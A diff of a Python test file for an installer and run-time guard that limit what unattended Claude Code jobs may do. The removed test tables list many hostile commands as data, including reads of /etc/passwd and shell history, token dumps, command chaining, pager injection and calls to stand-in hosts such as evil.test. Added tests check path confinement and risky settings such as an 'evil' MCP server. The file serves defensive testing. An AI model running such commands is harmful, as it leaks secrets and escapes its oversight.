@@ -116,67 +116,33 @@ class PrivatePackTests(unittest.TestCase):
 
 
 class PermissionPolicyTests(unittest.TestCase):
-    """What a pack may grant an unattended job. The installer checks the RULE names an allowed tool or command
-    (plan.permission_problem); the guard checks the ACTUAL arguments of every call at run time (guard.command_reason)."""
-    TRUST = plan.Trust(commands=('twg', 'slackcli'), env=('TWG_AGENT_DEFAULTS',), mcp_tools=('mcp__acme__get_issues',),
-                       domains=('acme.test',))
-    ALLOWED = ['Read', 'Grep', 'Glob', 'Read(notes/**)', 'mcp__acme__get_issues', 'WebFetch(domain:acme.test)', 'Bash(gh pr list:*)',
-               'Bash(gh api repos/acme/app/pulls:*)', 'Bash(git log:*)', 'Bash(sort:*)', 'Bash(jq .items)',
-               'Bash(twg jira workitem query *)', 'Bash(TWG_AGENT_DEFAULTS=1 twg jira workitem query *)', 'Bash(slackcli conversations unread *)']
-    REFUSED = ['Bash', 'Bash(*)', 'Write', 'Edit', 'Edit(//etc/**)', 'WebFetch', 'WebSearch', 'mcp__*', 'mcp__acme',
-               'mcp__acme__create_issue', 'mcp__other__get_issues', 'mcp__acme__x__get', 'WebFetch(domain:evil.test)',
-               'Bash(python -c x)', 'Bash(Python3:*)', 'Bash(OSASCRIPT:*)', 'Bash(timeout:*)', 'Bash(nohup:*)', 'Bash(command:*)',
-               'Bash(java:*)', 'Bash("sh" -c:*)', "Bash(s''h:*)", 'Bash(./script)', 'Bash(/bin/sh -c x)', 'Bash(cat /etc/passwd)',
-               'Bash(gh gist create:*)', 'Bash(git push:*)', 'Bash(git -c core.pager=sh log)',
-               'Bash(ls; rm -rf x)', 'Bash(gh pr list && curl x)', 'Bash(echo x\nrm y)', 'Bash(PAGER=sh git log:*)',
-               'Bash(GIT_EXTERNAL_DIFF=x git diff:*)', 'Bash(OTHER=1 twg x)', 'Bash(twg2 x)', 'Bash(git log {{ct.team}}:*)']
-    # allowed by a rule, refused by the guard when the job actually runs them
-    RUNTIME_REFUSED = ['sort -o ~/.zshrc notes/x', 'sort -uo /tmp/x a', 'sort --output=/tmp/x', 'git log -1 --output=~/.zshrc',
-                       'git diff --no-index /etc/passwd /dev/null', 'jq -R . ~/.zsh_history', 'cut -d: -f1 /etc/passwd',
-                       'gh api -XPOST /gists', 'gh api -fpublic=true repos/x', 'gh api graphql', 'gh api --method DELETE repos/o/r',
-                       'gh api -Fbody=@x repos/x', 'uniq a .claude/settings.json', 'git -c core.pager=sh log', 'PAGER=sh git log',
-                       '/bin/ls', 'ls /etc', 'ls ../..', 'sort a > /tmp/x', 'jq --rawfile a /etc/passwd .', 'echo $(id)', 'ls `id`',
-                       'wc --files0-from=/etc/x', 'twg x > ~/.zshrc', 'sort -k1o /tmp/x', 'sort -t, -o /tmp/x',
-                       'ls >& /tmp/x', 'ls &>> /tmp/x', 'ls 3> /tmp/x', 'ls <& 3', 'gh api -H x -XPUT repos/x',
-                       'sort -o $HOME/.zshrc', 'ls ${HOME}', 'ls {/etc,x}', 'cut -f1 {/etc/passwd,x}', 'jq -n env', 'jq env.GH_TOKEN',
-                       'jq -n input_filename', 'ls {notes,/etc}', 'ls {a..z}', 'cat <(id)', 'sort <(ls /etc)', 'ls >(tee x)',
-                       '(ls /etc)', 'ls ; (id)', 'jq . {/etc/passwd,x}', 'jq {/etc/passwd,.} x', 'jq {.,{/etc/passwd,y}} x',
-                       'jq {-n,.} x', 'jq {name:.n,id:.i} notes/x.json', "jq -n '{e,}nv'",
-                       'gh api http://127.0.0.1:18777/collect?d=x', 'gh api //evil.test/x', 'gh pr list -R evil.test/o/r',
-                       'gh pr list --repo=https://evil.test/o/r', 'gh pr list -Revil.test/o/r', 'gh pr list -R=evil.test/o/r',
-                       'gh pr list --repo=evil.test/o/r', 'gh pr list --repo evil.test/o/r', 'GH_HOST=evil.test gh pr list',
-                       'gh pr list --hostname evil.test', 'gh pr list -wR evil.test/o/r', 'gh pr list -LR 5 evil.test/o/r', 'git blame --contents=/etc/hosts README.md', 'cd notes && ls',
-                       'python3 notes/x.py', 'ls notes/link-out/', 'ls notes/l*/', 'ls notes/link-o?t/', 'ls {{/etc,x},y}',
-                       "ls '{'/etc,x'}'", 'ls notes/x[', 'ls notes/[l]ink-out/', 'sort notes/*', 'ls .??*', 'cut -f1 notes/?',
-                       'ls notes/{x}', 'jq . x{,}/../../etc/passwd', 'jq . notes/*.json']
-    RUNTIME_ALLOWED = ['sort', 'sort -u notes/x', 'git log --oneline -5', 'gh pr list --limit 100',
-                       'gh api repos/acme/app/dependabot/alerts --paginate --jq .[].severity', 'jq .items notes/x.json',
-                       'cut -d: -f1 notes/x', 'uniq -c', 'sort | uniq -c', 'ls notes', 'date +%F', 'wc -l notes/x',
-                       'gh api repos/x/y 2>/dev/null', 'ls 2>&1', 'tr a-z A-Z', 'jq {name:.n} notes/x.json',
-                       'jq .environment notes/x.json', 'jq . notes/x.json', 'gh pr list -R acme/app', 'tr [:upper:] [:lower:]', 'gh pr list --repo=acme/app', 'gh api /repos/acme/app/pulls', 'TWG_AGENT_DEFAULTS=1 twg jira workitem query --jql x', 'uniq -f 2 notes/x']
+    """Pack job rules are checked by the installer (plan.permission_problem, table in tests/test_permissions.py); the guard
+    keeps the run-time limits on files."""
 
-    def test_allowed_rules(self):
-        for rule in self.ALLOWED:
-            with self.subTest(rule=rule):
-                self.assertIsNone(plan.permission_problem(rule, self.TRUST))
-
-    def test_refused_rules(self):
-        for rule in self.REFUSED:
-            with self.subTest(rule=rule):
-                self.assertIsNotNone(plan.permission_problem(rule, self.TRUST))
-
-    def test_the_guard_checks_actual_arguments(self):
+    def test_relative_paths_are_relative_to_the_job_not_the_hook(self):
         guard = plan.guard_rules
-        with tempfile.TemporaryDirectory() as v, tempfile.TemporaryDirectory() as out:
-            os.makedirs(os.path.join(v, 'notes'))
-            os.symlink(out, os.path.join(v, 'notes', 'link-out'))  # a symlink already in the vault, pointing outside
-            run = lambda c: guard.check({'tool_name': 'Bash', 'tool_input': {'command': c}, 'cwd': v}, v, ('twg', 'slackcli'))
-            for cmd in self.RUNTIME_REFUSED:
-                with self.subTest(refused=cmd):
-                    self.assertIsNotNone(run(cmd))
-            for cmd in self.RUNTIME_ALLOWED:
-                with self.subTest(allowed=cmd):
-                    self.assertIsNone(run(cmd))
+        with tempfile.TemporaryDirectory() as v:
+            os.makedirs(os.path.join(v, 'work'))
+            ev = lambda tool, inp: guard.check({'tool_name': tool, 'tool_input': inp, 'cwd': v}, v)
+            self.assertIsNone(ev('Grep', {'pattern': '#to-triage', 'path': 'work'}))
+            self.assertIsNone(ev('Read', {'file_path': 'work/x.md'}))
+            self.assertIsNotNone(ev('Read', {'file_path': '../outside.md'}))
+            self.assertIsNotNone(ev('Grep', {'pattern': 'x', 'path': '../..'}))
+
+    def test_a_job_can_reread_only_its_own_saved_tool_output(self):
+        guard = plan.guard_rules
+        home = os.path.expanduser('~/.claude/projects/-tmp-ct-test')
+        sid, other = 'aaaaaaaa-1111-2222-3333-444444444444', 'bbbbbbbb-1111-2222-3333-444444444444'
+        mine = os.path.join(home, sid, 'tool-results', 'out.txt')
+        theirs = os.path.join(home, other, 'tool-results', 'out.txt')
+        with tempfile.TemporaryDirectory() as v:
+            ev = lambda p, s=sid, t=os.path.join(home, sid + '.jsonl'): guard.check(
+                {'tool_name': 'Read', 'tool_input': {'file_path': p}, 'cwd': v, 'session_id': s, 'transcript_path': t}, v)
+            self.assertIsNone(ev(mine))
+            self.assertIsNotNone(ev(theirs), 'another session')
+            self.assertIsNotNone(ev(os.path.join(home, sid, 'other.txt')), 'outside tool-results')
+            self.assertIsNotNone(ev(mine, s='../x'), 'bad session id')
+            self.assertIsNotNone(ev(mine, t='/tmp/fake.jsonl'), 'transcript outside ~/.claude/projects')
 
     def test_no_git_or_claude_files_anywhere_in_the_vault(self):
         guard = plan.guard_rules
@@ -187,56 +153,12 @@ class PermissionPolicyTests(unittest.TestCase):
                     self.assertIsNotNone(guard.check({'tool_name': 'Write', 'tool_input': {'file_path': os.path.join(v, rel)}, 'cwd': v}, v))
             self.assertIsNone(guard.check({'tool_name': 'Write', 'tool_input': {'file_path': os.path.join(v, 'notes', 'x.md')}, 'cwd': v}, v))
 
-    def test_the_guard_is_fast_on_hostile_input(self):
-        import time
-        guard = plan.guard_rules
-        with tempfile.TemporaryDirectory() as v:
-            for cmd in ("jq -n '" + '{a0,a1,a2,a3,a4,a5}' * 9 + "' ; sort -o ~/.zshrc x", 'ls ' + 'a ' * 20000):
-                start = time.time()
-                self.assertIsNotNone(guard.check({'tool_name': 'Bash', 'tool_input': {'command': cmd}, 'cwd': v}, v))
-                self.assertLess(time.time() - start, 1.0, 'a slow guard can be timed out by Claude Code')
-
-    def test_trusted_commands_reach_the_guard(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            pd = private_pack(os.path.join(tmp, 'p'))
-            a = answers(tmp, ['acme-private'], [pd], trusted_commands=['twg'])
-            install.install(a, log=lambda *x: None)
-            st = json.load(open(os.path.join(a['ct_home'], 'jobs', 'acme-brief', 'settings.json')))
-            self.assertIn('--commands twg', st['hooks']['PreToolUse'][0]['hooks'][0]['command'])
-
-    def test_one_command_table_for_installer_and_guard(self):
-        for cmd, rule in plan.guard_rules.JOB_COMMANDS.items():
-            with self.subTest(cmd=cmd):
-                probe = f'Bash({cmd} {sorted(rule["subcommands"])[0]}:*)' if rule.get('subcommands') else f'Bash({cmd}:*)'
-                self.assertIsNone(plan.permission_problem(probe))
-
-    def test_company_tools_mcp_tools_and_domains_need_the_users_trust(self):
-        self.assertIsNotNone(plan.permission_problem('Bash(twg jira workitem query *)'))
-        self.assertIsNone(plan.permission_problem('Bash(twg jira workitem query *)', plan.Trust(commands=('twg',))))
-        self.assertIsNotNone(plan.permission_problem('Bash(PATH=/tmp twg x)', plan.Trust(commands=('twg',), env=('PATH',))),
-                             'some variables can never be trusted')
-        self.assertIsNotNone(plan.permission_problem('mcp__acme__get_issues'))
-        self.assertIsNone(plan.permission_problem('mcp__acme__get_issues', plan.Trust(mcp_tools=('mcp__acme__get_issues',))))
-        self.assertIsNotNone(plan.permission_problem('mcp__acme__createIssue', plan.Trust(mcp_tools=('mcp__acme__get_issues',))),
-                             'only the exact tools listed')
-        self.assertIsNotNone(plan.permission_problem('WebFetch(domain:acme.test)'))
-
-    def test_every_public_rule_passes(self):
-        import glob
-        for f in glob.glob(os.path.join(ROOT, 'adapters', '*', '*.json')) + glob.glob(os.path.join(ROOT, 'packs', '*', 'jobs', '*', 'job.json')):
-            data = json.load(open(f))
-            rules = data.get('permissions_allow', []) + data.get('permissions', {}).get('allow', [])
-            trust = plan.Trust(mcp_tools=tuple(r for r in rules if r.startswith('mcp__')))  # choosing a tool trusts its listed tools
-            for rule in rules:
-                with self.subTest(file=os.path.relpath(f, ROOT), rule=rule):
-                    self.assertIsNone(plan.permission_problem(rule, trust))
-
     def test_install_refuses_a_bad_rule_before_writing_anything(self):
         with tempfile.TemporaryDirectory() as tmp:
             pd = private_pack(os.path.join(tmp, 'p'))
             jp = os.path.join(pd, 'jobs', 'acme-brief', 'job.json')
             job = json.load(open(jp))
-            job['permissions']['allow'] = ['Bash(timeout:*)']
+            job['permissions']['allow'] = ['Bash(sh -c:*)']
             json.dump(job, open(jp, 'w'))
             a = answers(tmp, ['acme-private'], [pd])
             with self.assertRaises(install.InstallError):
@@ -446,8 +368,19 @@ class RuntimeOnlyTests(unittest.TestCase):
             write(os.path.join(v, '.claude', 'skills', 'mine', 'SKILL.md'), '---\nname: mine\nallowed-tools: Bash\n---\n')
             pd = private_pack(os.path.join(tmp, 'p'))
             report = install.install(answers(tmp, ['acme-private'], [pd], vault_mode='runtime'), dry_run=True, log=lambda *x: None)
-            self.assertTrue(any('widens what they can do' in w for w in report['warnings']))
+            self.assertTrue(any('can widen what they do' in w for w in report['warnings']))
             self.assertTrue(any('declares allowed-tools' in w for w in report['warnings']))
+            write(os.path.join(v, '.claude', 'settings.local.json'), json.dumps({'enabledMcpjsonServers': []}))
+            os.remove(os.path.join(v, '.claude', 'settings.json'))
+            install.install(answers(tmp, ['acme-private'], [pd], vault_mode='runtime'), log=lambda *x: None)
+            levels = {i['check']: i['level'] for i in doctor.check(v, os.path.join(tmp, 'ct'), 'python3').items}
+            self.assertNotIn('vault file .claude/settings.local.json', levels, 'harmless settings are not flagged')
+            for risky in ({'env': {'X': '1'}}, {'permissions': {'additionalDirectories': ['/']}}, {'apiKeyHelper': 'x'},
+                          {'enabledMcpjsonServers': ['evil']}, {'enableAllProjectMcpServers': True}):
+                with self.subTest(risky=risky):
+                    write(os.path.join(v, '.claude', 'settings.local.json'), json.dumps(risky))
+                    levels = {i['check']: i['level'] for i in doctor.check(v, os.path.join(tmp, 'ct'), 'python3').items}
+                    self.assertEqual(levels.get('vault file .claude/settings.local.json'), 'warn')
 
     def test_runtime_only_needs_an_existing_vault(self):
         with tempfile.TemporaryDirectory() as tmp:
